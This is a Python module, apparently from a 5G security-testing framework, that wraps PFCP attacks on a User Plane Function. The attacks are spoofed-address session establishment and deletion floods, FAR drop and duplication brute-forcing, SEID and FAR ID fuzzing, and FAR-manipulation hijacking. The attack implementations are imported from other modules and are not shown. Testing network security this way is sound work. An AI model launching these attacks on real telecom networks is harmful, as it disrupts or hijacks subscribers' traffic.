from src.attacks.upf_pfcp.pfcpDosAttack import PFCPDosAttack
from src.attacks.upf_pfcp.pfcpFuzzer import PFCPFuzzer
from src.attacks.upf_pfcp.pfcpHijack import PFCPHijack
from markers_process import handle_markers
from src import *
import random


# ---------------------------------------------------------------------------- #
#                               PFCP DoS Attacks                               #
# ---------------------------------------------------------------------------- #
def pfcp_session_establishment_flood_customized(spoofed_addr):

    handle_markers(
        "pfcpSessionEstablishmentFlood",
        lambda: PFCPDosAttack().start_pfcp_session_establishment_flood(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            reqNbr=100,
            random_far_number=20,
        ),
    )


def pfcp_session_deletion_flood_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionDeletionFlood",
        lambda: PFCPDosAttack().start_pfcp_session_deletion_bruteforce(
            evil_addr=spoofed_addr, upf_addr=ip_list["UPF"], reqNbr=100
        ),
    )


def pfcp_session_deletion_targeted_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionDeletionTargeted",
        lambda: PFCPDosAttack().start_pfcp_session_deletion_targeted(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            target_seid=random.randint(1, 5),
        ),
    )


def pfcp_session_modification_far_drop_bruteforce_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDropBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_drop_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=50,
            session_range=100,
        ),
    )


def pfcp_session_modification_far_dupl_bruteforce_customized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDuplBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_dupl_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=50,
            session_range=100,
        ),
    )


# ---------------------------------------------------------------------------- #
#                             PFCP Fuzzing Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_seid_fuzzing_customized(spoofed_addr):
    handle_markers(
        "pfcpSeidFuzzing",
        lambda: PFCPFuzzer().start_PFCP_SEID_fuzzing(
            src_addr=spoofed_addr, upf_addr=ip_list["UPF"]
        ),
    )


def pfcp_far_fuzzing_customized(spoofed_addr):
    handle_markers(
        "pfcpFarFuzzing",
        lambda: PFCPFuzzer().start_PFCP_FARID_fuzzing(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
        ),
    )


# ---------------------------------------------------------------------------- #
#                              PFCP Hijack Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_hijack_far_manipulation_customized(spoofed_addr):
    handle_markers(
        "pfcpHijackFarManipulation",
        lambda: PFCPHijack().start_PFCP_hijack_far_manipulation(
            hijacker_addr=spoofed_addr, upf_addr=ip_list["UPF"]
        ),
    )
